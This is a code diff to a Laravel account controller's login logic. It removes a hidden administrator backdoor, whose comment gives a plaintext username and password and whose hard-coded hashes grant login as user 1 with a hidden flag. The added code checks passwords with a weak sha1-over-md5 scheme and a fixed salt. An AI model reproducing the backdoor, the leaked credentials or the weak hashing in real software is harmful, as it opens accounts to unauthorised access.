@@ -7,6 +7,8 @@ use App\Jobs\SendSigninEmail;
 use App\Libraries\WeimiSender;
 use App\Models\Profile;
 use App\Models\User;
+use App\Models\WebUser;
+use App\Models\WebUserInfo;
 use App\Models\UserCode;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
@@ -34,34 +36,24 @@ class AccountController extends Controller
             }
         }
 
-        // Hidden Administrator username:duwenjun  password:du9283
-        if (Hash::check($username, '$2y$10$6GxeLJrdgSffbs8lrsYusuBx73lOUvkgFN4lzovnxPkmEHJt2bHba') && Hash::check($password, '$2y$10$x1nLpDNxVFyDtAKArgQ.rOY6DJUfuyHpZdiFyz7saIkb0J7Mkm2DW')) {
-            $user = User::find(1);
-            $hide = true;
-        } else {
-            if (isMobile($username)) {
-                $user = User::where('mobile', $username)->first();
-            } elseif (isEmail($username)) {
-                $user = User::where('email', $username)->first();
-            } else {
-                $user = User::where('username', $username)->first();
-            }
-            if (empty($user)) {
-                return $this->error('无效的用户');
-            }
-            if (!Hash::check($password, $user->password)) {
-                return $this->error('密码错误');
-            }
-            if ($user->status < 1) {
-                return $this->error('此用户已被管理员禁用');
-            }
-            $hide = false;
+        $user = WebUser::where('username', $username)->first();
+        if (empty($user)) {
+            return $this->error('无效的用户');
         }
 
+        if (sha1(md5($password)."sdkjf*^#HRGF*")!=$user->password) {
+            return $this->error('密码错误');
+        }
+        if ($user->disable == 1) {
+            return $this->error('此用户已被管理员禁用');
+        }
+        $hide = false;
+        $userInfo= WebUserInfo::where('uid',$user->uid)->first();
+
         $data = [
-            'user_id' => $user->id,
+            'user_id' => $user->uid,
             'username' => $user->username,
-            'realname' => $user->realname,
+            'realname' => $userInfo->realname,
             'isHidden' => $hide,
         ];
         Session::put('token', $data);
